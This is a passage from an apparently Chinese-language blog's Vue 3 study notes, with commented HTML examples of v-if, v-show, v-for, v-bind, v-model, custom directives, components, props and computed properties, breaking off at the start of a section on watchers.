 --&gt;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
	&lt;head&gt;
		&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;
		&lt;title&gt;&lt;&#x2F;title&gt;
		&lt;!-- 引入最新Vue3脚本 --&gt;
		&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;unpkg.com&#x2F;vue@3&#x2F;dist&#x2F;vue.global.js&quot;&gt;&lt;&#x2F;script&gt;
	&lt;&#x2F;head&gt;
	&lt;body&gt;
		&lt;div id&#x3D;&quot;app&quot;&gt;
			&lt;!-- 渲染数据 --&gt;
			&lt;p v-if&#x3D;&quot;type&#x3D;&#x3D;&#39;A&#39;&quot;&gt;A.优秀&lt;&#x2F;p&gt;
			&lt;p v-else-if&#x3D; &quot;type&#x3D;&#x3D;&#39;B&#39;&quot;&gt;B.良好&lt;&#x2F;p&gt;
			&lt;p v-else-if&#x3D; &quot;type&#x3D;&#x3D;&#39;C&#39;&quot;&gt;C.及格&lt;&#x2F;p&gt;
			&lt;p v-else &gt;D.不及格&lt;&#x2F;p&gt;
		&lt;&#x2F;div&gt;
		
		&lt;script&gt;
			const app &#x3D; &#123;
			&#x2F;&#x2F; 初始化数据
				data()&#123;
					return&#123;
						type: &quot;B&quot;
					&#125;
				&#125;
			&#125;;
			
			&#x2F;&#x2F; 挂载
			Vue.createApp(app).mount(&quot;#app&quot;); 
		&lt;&#x2F;script&gt;
	&lt;&#x2F;body&gt;
&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2023/04/12/Vue3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20230413111338989.png" alt="image-20230413111338989"></p>
<h2 id="2-v-if与v-show的区别"><a href="#2-v-if与v-show的区别" class="headerlink" title="2 v-if与v-show的区别"></a>2 v-if与v-show的区别</h2><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">&lt;!--v-if与v-show的区别 
	v-if:	若条件不成立，则修饰的元素不会被加载到DOM。
	v-show:	若条件不成立，则修饰的元素会加载到DOM，并且将此元素的display设为none，即不可见。
 --&gt;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
	&lt;head&gt;
		&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;
		&lt;title&gt;v-if与v-show的区别&lt;&#x2F;title&gt;
		&lt;!-- 引入最新Vue3脚本 --&gt;
		&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;unpkg.com&#x2F;vue@3&#x2F;dist&#x2F;vue.global.js&quot;&gt;&lt;&#x2F;script&gt;
	&lt;&#x2F;head&gt;
	&lt;body&gt;
		&lt;div id&#x3D;&quot;app&quot;&gt;
			&lt;!-- 渲染数据 --&gt;
			&lt;p v-if&#x3D;&quot;flag&quot;&gt;v-if指令渲染此元素&lt;&#x2F;p&gt;
			&lt;p v-show&#x3D;&quot;flag&quot;&gt;v-show指令渲染此元素&lt;&#x2F;p&gt;
		&lt;&#x2F;div&gt;
		
		&lt;script&gt;
			const app &#x3D; &#123;
			&#x2F;&#x2F; 初始化数据
				data()&#123;
					return&#123;
						flag: false
					&#125;
				&#125;
			&#125;;
			
			&#x2F;&#x2F; 挂载
			Vue.createApp(app).mount(&quot;#app&quot;); 
		&lt;&#x2F;script&gt;
	&lt;&#x2F;body&gt;
&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2023/04/12/Vue3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20230413113601616.png" alt="image-20230413113601616"></p>
<h2 id="3-v-for指令"><a href="#3-v-for指令" class="headerlink" title="3  v-for指令"></a>3  v-for指令</h2><blockquote>
<p>类似Java中的For Each 循环</p>
</blockquote>
<pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">&lt;!-- v-for指令
	遍历数组
	&#123;
		&lt;li v-for&#x3D;&quot;(元素变量,索引) in 被循环的数组&quot;&gt;&lt;&#x2F;li&gt;
		sites: &#123;...&#125;
	&#125;
--&gt;

&lt;!--高级用法：&lt;template&gt;标签
	将页面某一个子标签作为一个整体统一处理。
 --&gt;
 
 &lt;!--遍历对象 
	&#123;
		&lt;li v-for&#x3D;&quot;(元素变量,key,索引) in 被循环的对象&quot;&gt;&lt;&#x2F;li&gt;
		obj: &#123; &#x2F;&#x2F; 对象
		&#x2F;&#x2F; key:value
			name: &quot;百度&quot;,
			url: &quot;http:&#x2F;&#x2F;www.baidu.com&quot;,
			slogan: &quot;百度一下，你就知道&quot; &#x2F;&#x2F; 标语 
		&#125;
	&#125;
--&gt;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
	&lt;head&gt;
		&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;
		&lt;title&gt;v-for索引、遍历对象&lt;&#x2F;title&gt;
		&lt;!-- 引入最新Vue3脚本 --&gt;
		&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;unpkg.com&#x2F;vue@3&#x2F;dist&#x2F;vue.global.js&quot;&gt;&lt;&#x2F;script&gt;
	&lt;&#x2F;head&gt;
	&lt;body&gt;
		&lt;div id&#x3D;&quot;app&quot;&gt;
			&lt;!-- 渲染数据 --&gt;
			&lt;h2&gt;网站:&lt;&#x2F;h2&gt;
			&lt;ol&gt;
				&lt;!-- 赋值规则：值给site，索引给index
				&lt;li v-for&#x3D;&quot;(site,index) in sites&quot;&gt;
					&#123;&#123; index &#125;&#125; --- &#123;&#123; site.text &#125;&#125;
				&lt;&#x2F;li&gt; --&gt;
				&lt;template v-for&#x3D;&quot;(site,index) in sites&quot;&gt;
					&lt;li&gt;&#123;&#123; index &#125;&#125; --- &#123;&#123; site.text &#125;&#125;&lt;&#x2F;li&gt;
					&lt;li&gt;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&lt;&#x2F;li&gt;
				&lt;&#x2F;template&gt;
			&lt;&#x2F;ol&gt;
			
			&lt;ul&gt;
				&lt;li v-for&#x3D;&quot;(val,key,index) in obj&quot;&gt;
					索引：&#123;&#123; index &#125;&#125; ，属性：&#123;&#123; key &#125;&#125;，值：&#123;&#123; val &#125;&#125;
				&lt;&#x2F;li&gt;
			&lt;&#x2F;ul&gt;
			
			&lt;ul&gt;
				&lt;!-- 从1开始遍历 --&gt;
				&lt;li v-for&#x3D;&quot;n in 10&quot;&gt;&#123;&#123; n &#125;&#125;&lt;&#x2F;li&gt;
			&lt;&#x2F;ul&gt;
		&lt;&#x2F;div&gt;
		
		&lt;script&gt;
			const app &#x3D; &#123;
			&#x2F;&#x2F; 初始化数据
				data()&#123;
					return&#123;
						sites: [ &#x2F;&#x2F; 数组
							&#123;text: &quot;百度&quot;&#125;, &#x2F;&#x2F;对象
							&#123;text: &quot;字节&quot;&#125;,
							&#123;text: &quot;谷歌&quot;&#125;,
							&#123;text: &quot;360&quot;&#125;,
							&#123;text: &quot;腾讯&quot;&#125;
						],
						obj: &#123; &#x2F;&#x2F; 对象
							name: &quot;百度&quot;,
							url: &quot;http:&#x2F;&#x2F;www.baidu.com&quot;,
							slogan: &quot;百度一下，你就知道&quot; &#x2F;&#x2F; 标语 
						&#125;
					&#125;
				&#125;
			&#125;;
			
			&#x2F;&#x2F; 挂载
			Vue.createApp(app).mount(&quot;#app&quot;); 
		&lt;&#x2F;script&gt;
	&lt;&#x2F;body&gt;
&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2023/04/12/Vue3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20230413141744200.png" alt="image-20230413141744200"></p>
<h2 id="4-传参数、v-bind指令"><a href="#4-传参数、v-bind指令" class="headerlink" title="4 传参数、v-bind指令"></a>4 传参数、v-bind指令</h2><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">&lt;!-- 传参数
	Vue中的标签指令可以传递动态数据作为参数声明。
--&gt;
&lt;!-- v-bind指令，可以简写为冒号
	表示将一个属性的取值动态的和Vue中一个变量绑定，只要变量的值发生改变，对应的绑定元素就会更新。
	v-bind:html的属性名 &#x3D; &quot;Vue中的变量名&quot;
--&gt;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
	&lt;head&gt;
		&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;
		&lt;!-- 引入最新Vue3脚本 --&gt;
		&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;unpkg.com&#x2F;vue@3&#x2F;dist&#x2F;vue.global.js&quot;&gt;&lt;&#x2F;script&gt;
		&lt;title&gt;传参数&lt;&#x2F;title&gt;
	&lt;&#x2F;head&gt;
	&lt;body&gt;
		&lt;div id&#x3D;&quot;app&quot;&gt;
			&lt;a v-bind:href&#x3D;&quot;url&quot;&gt;点我:实现网页跳转&lt;&#x2F;a&gt;
		&lt;&#x2F;div&gt;
		&lt;script&gt;
			const app&#x3D;&#123;
				data()&#123;
					return&#123;
						url: &quot;http:&#x2F;&#x2F;www.baidu.com&quot;
					&#125;
				&#125;
			&#125;;
			Vue.createApp(app).mount(&quot;#app&quot;);
		&lt;&#x2F;script&gt;
	&lt;&#x2F;body&gt;
&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2023/04/12/Vue3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20230413103933592.png" alt="image-20230413103933592"></p>
<h2 id="5-用户输入之双向数据绑定、v-model指令"><a href="#5-用户输入之双向数据绑定、v-model指令" class="headerlink" title="5 用户输入之双向数据绑定、v-model指令"></a>5 用户输入之双向数据绑定、v-model指令</h2><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">&lt;!--用户输入 
	1.双向数据绑定
		元素的数据和vue中对象的数据相互影响，取值相同，同步更新。
 --&gt;
 &lt;!-- v-model指令
	用来实现Vue和DOM元素双向数据绑定。
	&#123;
		&lt;span v-model&#x3D;&quot;Vue中定义的变量&quot;&gt;&lt;&#x2F;span&gt;
		
		return&#123;
			message: &quot;hello Vue&quot;
		&#125;
	&#125;
  --&gt;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
	&lt;head&gt;
		&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;
		&lt;title&gt;用户输入之双向数据绑定、v-model指令&lt;&#x2F;title&gt;
		&lt;!-- 引入最新Vue3脚本 --&gt;
		&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;unpkg.com&#x2F;vue@3&#x2F;dist&#x2F;vue.global.js&quot;&gt;&lt;&#x2F;script&gt;
	&lt;&#x2F;head&gt;
	&lt;body&gt;
		&lt;div id&#x3D;&quot;app&quot;&gt;
			&lt;!-- 渲染数据 --&gt;
			&lt;p&gt;message值: &#123;&#123; message &#125;&#125;&lt;&#x2F;p&gt;
			&lt;p&gt;
				&lt;input v-model&#x3D;&quot;message&quot; &#x2F;&gt;
			&lt;&#x2F;p&gt;
		&lt;&#x2F;div&gt;
		
		&lt;script&gt;
			const app &#x3D; &#123;
			&#x2F;&#x2F; 初始化数据
				data()&#123;
					return&#123;
						message: &quot;hello Vue&quot;
					&#125;
				&#125;
			&#125;;
			
			&#x2F;&#x2F; 挂载
			Vue.createApp(app).mount(&quot;#app&quot;); 
		&lt;&#x2F;script&gt;
	&lt;&#x2F;body&gt;
&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2023/04/12/Vue3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20230413105039041.png" alt="image-20230413105039041"></p>
<h1 id="Vue自定义指令"><a href="#Vue自定义指令" class="headerlink" title="Vue自定义指令"></a>Vue自定义指令</h1><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">&lt;!--Vue自定义指令
	局部注册指令
	注册指令：实例化Vue对象，通过directive()完成自定义指令的注册。
		directive()方法参数，参数1表示指令名称(v-指令名称)，参数2表示用匿名函数封装该指令要实现的业务逻辑
 --&gt;
 &lt;!-- 全局注册指令
	&#123;
		directives: &#123;&#x2F;&#x2F; directives属性表示可以同时注册多个自定义指令
			&#x2F;&#x2F; 指令名: &#123;
				&#x2F;&#x2F;指令实现
			&#125;
		&#125;
	&#125;
  --&gt;
 
&lt;!DOCTYPE html&gt;
&lt;html&gt;
	&lt;head&gt;
		&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;
		&lt;title&gt;Vue自定义指令 &lt;&#x2F;title&gt;
		&lt;!-- 引入最新Vue3脚本 --&gt;
		&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;unpkg.com&#x2F;vue@3&#x2F;dist&#x2F;vue.global.js&quot;&gt;&lt;&#x2F;script&gt;
	&lt;&#x2F;head&gt;
	&lt;body&gt;
		&lt;div id&#x3D;&quot;app&quot;&gt;
			&lt;!-- 调用指令 --&gt;
			&lt;input type&#x3D;&quot;text&quot; v-focus&#x2F;&gt;
			&lt;input type&#x3D;&quot;text&quot; v-foc&#x2F;&gt;
		&lt;&#x2F;div&gt;
		
		&lt;script&gt;
			
			const app &#x3D; Vue.createApp(&#123;
			&#x2F;&#x2F; 初始化数据
				data()&#123;
					return&#123;
						
					&#125;
				&#125;,
				&#x2F;&#x2F; 全局注册指令
				directives: &#123;&#x2F;&#x2F; directives属性表示可以同时注册多个自定义指令
					foc: &#123;
						mounted(el)&#123;
							el.focus();&#x2F;&#x2F; 获取焦点
						&#125;
					&#125;
				&#125;
			&#125;);
			
			&#x2F;&#x2F; 局部注册自定义指令：v-focus 获取输入光标
			app.directive(&quot;focus&quot;,&#123;
				&#x2F;&#x2F; el表示挂载点的element元素(这里是input元素),即目标元素
				mounted(el)&#123; &#x2F;&#x2F; 一挂载就触发执行该函数
					el.focus(); &#x2F;&#x2F; 表示获取当前元素的焦点
					alert(&quot;input获取到了焦点&quot;)
				&#125;
			&#125;)
			
			&#x2F;&#x2F;挂载
			app.mount(&quot;#app&quot;); 
		&lt;&#x2F;script&gt;
	&lt;&#x2F;body&gt;
&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2023/04/12/Vue3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20230418121117880.png" alt="image-20230418121117880"></p>
<h1 id="Vue3组件"><a href="#Vue3组件" class="headerlink" title="Vue3组件"></a>Vue3组件</h1><h2 id="1-全局组件"><a href="#1-全局组件" class="headerlink" title="1 全局组件"></a>1 全局组件</h2><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">&lt;!--全局组件封装步骤： 
	1.创建Vue实例对象
	2.通过app.component()注册全局组件。需要声明组件名称和组件的封装HTML片断(template属性)
	3.将对象挂载到页面指定元素上
	4.通过组件名标签的形式访问组件
 --&gt;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
	&lt;head&gt;
		&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;
		&lt;title&gt;&lt;&#x2F;title&gt;
		&lt;!-- 引入最新Vue3脚本 --&gt;
		&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;unpkg.com&#x2F;vue@3&#x2F;dist&#x2F;vue.global.js&quot;&gt;&lt;&#x2F;script&gt;
	&lt;&#x2F;head&gt;
	&lt;body&gt;
		&lt;div id&#x3D;&quot;app&quot;&gt;
			&lt;!-- 4.通过组件名标签的形式访问组件 --&gt;
			&lt;my-component&gt;&lt;&#x2F;my-component&gt;
			&lt;my-component&gt;&lt;&#x2F;my-component&gt;
		&lt;&#x2F;div&gt;
		
		&lt;script&gt;
			&#x2F;&#x2F;1.创建实例对象
			const app &#x3D; Vue.createApp(&#123;
			&#x2F;&#x2F; 初始化数据
				data()&#123;
					return&#123;
						
					&#125;
				&#125;
			&#125;);
			
			&#x2F;&#x2F; 2.通过component函数绑定自定义全局组件
			&#x2F;**
			 * 参数1：表示封装的组件名（注册组件名）
			 * 参数2：使用&#123;&#125;声明封装的这个组件的HTML结构（组件的实现）
			 * template属性:表示指定被封装的HTML的结构
			 *&#x2F;
			app.component(
				&quot;my-component&quot;,
				&#123;
					template: &#39;&lt;div style&#x3D;&quot;color:red;&quot;&gt;&lt;h1&gt;自定义组件封装:全局组件&lt;&#x2F;h1&gt;&lt;&#x2F;div&gt;&#39;
				&#125;
			);
			
			&#x2F;&#x2F;3.挂载
			app.mount(&quot;#app&quot;);
		&lt;&#x2F;script&gt;
	&lt;&#x2F;body&gt;
&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2023/04/12/Vue3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20230413151252789.png" alt="image-20230413151252789"></p>
<h2 id="2-局部组件"><a href="#2-局部组件" class="headerlink" title="2 局部组件"></a>2 局部组件</h2><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">&lt;!--局部组件封装步骤： 
	1.声明一个外部的js变量，封装组件实现(声明在template属性上)
	2.components属性中用键值对定义组件名和关联的js变量
	3.创建Vue实例并挂载
	4.以组件名标签的形式访问组件
 --&gt;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
	&lt;head&gt;
		&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;
		&lt;title&gt;&lt;&#x2F;title&gt;
		&lt;!-- 引入最新Vue3脚本 --&gt;
		&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;unpkg.com&#x2F;vue@3&#x2F;dist&#x2F;vue.global.js&quot;&gt;&lt;&#x2F;script&gt;
	&lt;&#x2F;head&gt;
	&lt;body&gt;
		&lt;div id&#x3D;&quot;app&quot;&gt;
			&lt;!-- 4.以组件名标签的形式访问组件 --&gt;
			&lt;my-component&gt;&lt;&#x2F;my-component&gt;
			&lt;my-component2&gt;&lt;&#x2F;my-component2&gt;
		&lt;&#x2F;div&gt;
		
		&lt;script&gt;
			&#x2F;&#x2F; 1.声明一个外部的js变量，封装组件实现(声明在template属性上)
			&#x2F;&#x2F; tmplate属性：组件实现
			const html_code &#x3D; &#123;
				template: &#39;&lt;div style&#x3D;&quot;color:red;&quot;&gt;&lt;h1&gt;自定义组件:my-component&lt;&#x2F;h1&gt;&lt;&#x2F;div&gt;&#39;
			&#125;;
			const html_code2 &#x3D; &#123;
				template: &#39;&lt;div style&#x3D;&quot;color:red;&quot;&gt;&lt;h1&gt;自定义组件2:my-component2&lt;&#x2F;h1&gt;&lt;&#x2F;div&gt;&#39;
			&#125;;
			
			const app &#x3D; &#123;
			&#x2F;&#x2F; 初始化数据
				data()&#123;
					return&#123;
						
					&#125;
				&#125;,
				components: &#123; &#x2F;&#x2F; 2.components属性中用键值对定义组件名和关联的js变量
					&quot;my-component&quot;: html_code,
					&quot;my-component2&quot;: html_code2
				&#125;
			&#125;;
			
			&#x2F;&#x2F; 3.创建Vue实例并挂载
			Vue.createApp(app).mount(&quot;#app&quot;); 
		&lt;&#x2F;script&gt;
	&lt;&#x2F;body&gt;
&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2023/04/12/Vue3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20230413154025386.png" alt="image-20230413154025386"></p>
<h1 id="props属性、组件传值、动态绑定数据"><a href="#props属性、组件传值、动态绑定数据" class="headerlink" title="props属性、组件传值、动态绑定数据"></a>props属性、组件传值、动态绑定数据</h1><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue"> &lt;!--组件传值：props属性
	用来标记父组件中哪一个自定义属性可以向子组件传值,若传值成功，使用&#123;&#123;属性名&#125;&#125;访问该值。
  
  --&gt;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
	&lt;head&gt;
		&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;
		&lt;title&gt;props属性、组件传值、动态绑定数据&lt;&#x2F;title&gt;
		&lt;!-- 引入最新Vue3脚本 --&gt;
		&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;unpkg.com&#x2F;vue@3&#x2F;dist&#x2F;vue.global.js&quot;&gt;&lt;&#x2F;script&gt;
	&lt;&#x2F;head&gt;
	&lt;body&gt;
		&lt;div id&#x3D;&quot;app&quot;&gt;
			&lt;!-- sites数组中每一个对象的id和title用v-bind指令动态绑定数据 --&gt;
			&lt;!-- &lt;site_name v-for&#x3D;&quot;site in sites&quot; v-bind:id&#x3D;&quot;site.id&quot; v-bind:title&#x3D;&quot;site.title&quot; &gt;&lt;&#x2F;site_name&gt; --&gt;
			&lt;site_name v-for&#x3D;&quot;site in sites&quot; :id&#x3D;&quot;site.id&quot; :title&#x3D;&quot;site.title&quot; &gt;&lt;&#x2F;site_name&gt;
		&lt;&#x2F;div&gt;
		
		&lt;script&gt;
			
			const code_html &#x3D; &#123;
				props: [&quot;id&quot;,&quot;title&quot;], &#x2F;&#x2F;props数组用来接受哪些自定义属性可以子组件传值。
				template: &#39;&lt;h1&gt;&#123;&#123; id &#125;&#125;,&#123;&#123;title&#125;&#125;&lt;&#x2F;h1&gt;&#39; &#x2F;&#x2F;读取传过来的值
			&#125;;
			const app &#x3D; &#123;
			&#x2F;&#x2F; 初始化数据
				data()&#123;
					return&#123;
						sites: [
							&#123;id: 1,title: &quot;百度&quot;&#125;,
							&#123;id: 2,title: &quot;谷歌&quot;&#125;,
							&#123;id: 3,title: &quot;字节&quot;&#125;
						]
					&#125;
				&#125;,
				&#x2F;&#x2F;注册局部组件
				components: &#123;
					&quot;site_name&quot;: code_html
				&#125;
			&#125;;
			
			&#x2F;&#x2F; 挂载
			Vue.createApp(app).mount(&quot;#app&quot;); 
		&lt;&#x2F;script&gt;
	&lt;&#x2F;body&gt;
&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2023/04/12/Vue3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20230413160041226.png" alt="image-20230413160041226"></p>
<p>自定义组件的属性动态绑定数据</p>
<p><img src="/2023/04/12/Vue3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20230413162606202.png" alt="image-20230413162606202"></p>
<p><img src="/2023/04/12/Vue3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20230413165711899.png" alt="image-20230413165711899"></p>
<h1 id="计算属性computed和methods的区别"><a href="#计算属性computed和methods的区别" class="headerlink" title="计算属性computed和methods的区别"></a>计算属性computed和methods的区别</h1><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">&lt;!--计算属性 
	computed用来将一些复杂的业务逻辑放在计算属性中封装，外部调用访问。
	&#123;
		computed: &#123;
			&#x2F;&#x2F; 定义方法完成复杂业务逻辑
			方法名称(参数列表)&#123;&#125;
		&#125;
	&#125;
 --&gt;
 
 &lt;!-- 计算属性computed与methods的区别
	当一个核心算法会被很多地方调用的业务逻辑要封装到computed，这样提高运行效率
	调用方式不同：使用方法名调用computed，使用方法()调用method
	computed基于缓存，只有当依赖的数据发生改变时才会重新去获取数据。
	methods只要函数被调用，都会重新去加载和渲染数据。
  --&gt;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
	&lt;head&gt;
		&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;
		&lt;title&gt;计算属性computed与methods的区别&lt;&#x2F;title&gt;
		&lt;!-- 引入最新Vue3脚本 --&gt;
		&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;unpkg.com&#x2F;vue@3&#x2F;dist&#x2F;vue.global.js&quot;&gt;&lt;&#x2F;script&gt;
	&lt;&#x2F;head&gt;
	&lt;body&gt;
		&lt;div id&#x3D;&quot;app&quot;&gt;
			&lt;p&gt;传统方式获取字符串反转:&#123;&#123; message.split(&#39;&#39;).reverse().join(&#39;&#39;) &#125;&#125;&lt;&#x2F;p&gt;
			&lt;p&gt;调用计算属性computed获取字符串反转：&#123;&#123; reverseStr &#125;&#125;&lt;&#x2F;p&gt;
			&lt;p&gt;调用methods获取字符串反转：&#123;&#123; reverseStr2() &#125;&#125;&lt;&#x2F;p&gt;
		&lt;&#x2F;div&gt;
		
		&lt;script&gt;
			const app &#x3D; &#123;
			&#x2F;&#x2F; 初始化数据
				data()&#123;
					return&#123;
						message: &quot;luotao&quot;
					&#125;
				&#125;,
				computed: &#123; &#x2F;&#x2F;计算属性
					&#x2F;&#x2F; 定义方法完成复杂业务逻辑
					reverseStr()&#123;
						return this.message.split(&#39;&#39;).reverse().join(&#39;&#39;)
					&#125;
				&#125;,
				methods: &#123; &#x2F;&#x2F;自定义方法
					&#x2F;&#x2F; 定义方法完成复杂业务逻辑
					reverseStr2()&#123;
						return this.message.split(&#39;&#39;).reverse().join(&#39;&#39;)
					&#125;
				&#125;
			&#125;;
			
			&#x2F;&#x2F; 挂载
			Vue.createApp(app).mount(&quot;#app&quot;); 
		&lt;&#x2F;script&gt;
	&lt;&#x2F;body&gt;
&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2023/04/12/Vue3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20230413174350030.png" alt="image-20230413174350030"></p>
<h1 id="Vue3监听器"><a href="#Vue3监听器" class="headerlink" title="Vue3监听器"></a>Vue3监听器</h1><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">&lt;!--Vue3监听器 
	通过对页面中元素进行监听，当某些事件被触发时，去调用指定的任务。
	Vue提供watch属性来响应监听数据的变化
	步骤：
	1.注册监听
		绑定到vue对象，通过$watch属性注册监听
	2.指定要注册的监听对象,定义监听触发后执行的任务
	&#123;
